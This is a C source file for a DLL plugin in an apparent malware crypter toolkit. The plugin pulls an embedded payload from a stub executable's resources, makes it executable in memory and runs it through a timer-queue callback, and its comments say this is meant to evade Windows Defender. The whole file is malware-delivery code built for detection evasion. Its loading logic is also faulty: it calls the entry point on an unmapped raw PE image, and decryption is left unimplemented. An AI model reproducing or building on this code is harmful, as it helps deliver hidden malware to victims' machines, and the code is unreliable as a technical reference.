// Injector Plugin - Timer Queue Memory Loader
// This plugin runs at PREINJECT stage and loads the main encrypted payload
// from the stub's embedded resources into memory, then executes it using
// timer callbacks to evade WD detection.
//
// Design:
// - Plugin is appended to stub.exe as overlay
// - Stub loads this plugin DLL into memory
// - Plugin exports DllMain which fires at PREINJECT stage
// - Plugin reads encrypted payload from stub's resources (not from disk)
// - Plugin decrypts payload in-memory
// - Plugin uses CreateTimerQueueTimer for stealthy execution
// - All operations happen in stub's process context

#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

// Global state for payload
static LPVOID g_payloadMem = NULL;
static DWORD g_payloadSize = 0;

// Log to temp for debugging
static void plugin_log(const char* msg) {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat(path, "injector_plugin_memory.log");
    
    FILE* f = fopen(path, "a");
    if (f) {
        fprintf(f, "[INJECTOR_MEMORY] %s\n", msg);
        fclose(f);
    }
}

// Timer callback - executes the decrypted payload
VOID CALLBACK PayloadExecutionCallback(PVOID param, BOOLEAN fired) {
    if (!fired || !g_payloadMem) return;
    
    plugin_log("Timer callback fired - executing payload in memory");
    
    // Change memory protection to executable
    DWORD old;
    if (VirtualProtect(g_payloadMem, g_payloadSize, PAGE_EXECUTE_READ, &old)) {
        plugin_log("Memory protection changed to PAGE_EXECUTE_READ");
        
        // Get entry point (payload should be proper PE with entry point)
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)g_payloadMem;
        if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)g_payloadMem + dosHeader->e_lfanew);
            if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
                // Calculate entry point RVA
                DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
                void (*entryPoint)() = (void(*)())((BYTE*)g_payloadMem + entryRVA);
                
                plugin_log("Calling payload entry point");
                
                // Execute payload
                __try {
                    entryPoint();
                    plugin_log("Payload executed successfully");
                } __except(EXCEPTION_EXECUTE_HANDLER) {
                    plugin_log("Exception during payload execution");
                }
            }
        }
    } else {
        plugin_log("Failed to change memory protection");
    }
}

// Load encrypted payload from stub's resources
static BOOL LoadPayloadFromResources() {
    plugin_log("Loading payload from stub resources");
    
    // Get handle to current module (the stub that loaded us)
    HMODULE hStub = GetModuleHandleA(NULL);
    if (!hStub) {
        plugin_log("Failed to get stub module handle");
        return FALSE;
    }
    
    // Find the payload.dll resource (embedded by stealth_cryptor)
    HRSRC hRes = FindResourceA(hStub, MAKEINTRESOURCEA(101), "PAYLOAD_DLL");
    if (!hRes) {
        plugin_log("Failed to find PAYLOAD_DLL resource");
        return FALSE;
    }
    
    HGLOBAL hResData = LoadResource(hStub, hRes);
    if (!hResData) {
        plugin_log("Failed to load PAYLOAD_DLL resource");
        return FALSE;
    }
    
    LPVOID pResData = LockResource(hResData);
    g_payloadSize = SizeofResource(hStub, hRes);
    
    if (!pResData || g_payloadSize == 0) {
        plugin_log("Resource data is NULL or size is 0");
        return FALSE;
    }
    
    char buf[256];
    sprintf(buf, "Found payload resource: %lu bytes", g_payloadSize);
    plugin_log(buf);
    
    // Allocate RW memory for payload
    g_payloadMem = VirtualAlloc(NULL, g_payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_payloadMem) {
        plugin_log("Failed to allocate memory for payload");
        return FALSE;
    }
    
    // Copy encrypted payload to allocated memory
    memcpy(g_payloadMem, pResData, g_payloadSize);
    plugin_log("Payload copied to allocated memory");
    
    // NOTE: In real implementation, decrypt here using key from stub
    // For now, assuming payload is already decrypted by stub before plugin runs
    
    return TRUE;
}

// Worker thread that sets up timer and waits
DWORD WINAPI TimerWorkerThread(LPVOID param) {
    plugin_log("Timer worker thread started");
    
    // Load payload from resources
    if (!LoadPayloadFromResources()) {
        plugin_log("Failed to load payload from resources");
        return 1;
    }
    
    // Create timer queue
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) {
        plugin_log("Failed to create timer queue");
        return 1;
    }
    
    HANDLE hTimer = NULL;
    // Fire after 1 second delay
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, PayloadExecutionCallback, 
                               NULL, 1000, 0, WT_EXECUTEDEFAULT)) {
        plugin_log("Failed to create timer");
        DeleteTimerQueue(hTimerQueue);
        return 1;
    }
    
    plugin_log("Timer created - payload will execute in 1 second");
    
    // Wait for timer to fire
    Sleep(3000);
    
    // Cleanup
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    
    plugin_log("Timer worker thread complete");
    return 0;
}

// Plugin entry point - called by stub at PREINJECT stage
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        plugin_log("=== INJECTOR MEMORY PLUGIN LOADED ===");
        plugin_log("Stage: PREINJECT - Loading payload from resources");
        
        // Create worker thread to avoid blocking DLL load
        HANDLE hThread = CreateThread(NULL, 0, TimerWorkerThread, NULL, 0, NULL);
        if (hThread) {
            // Wait briefly to ensure timer is set up
            WaitForSingleObject(hThread, 2000);
            CloseHandle(hThread);
            plugin_log("Worker thread completed setup");
        } else {
            plugin_log("Failed to create worker thread");
        }
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        // Cleanup
        if (g_payloadMem) {
            VirtualFree(g_payloadMem, 0, MEM_RELEASE);
            g_payloadMem = NULL;
        }
        plugin_log("Plugin unloaded - memory cleaned");
    }
    
    return TRUE;
}
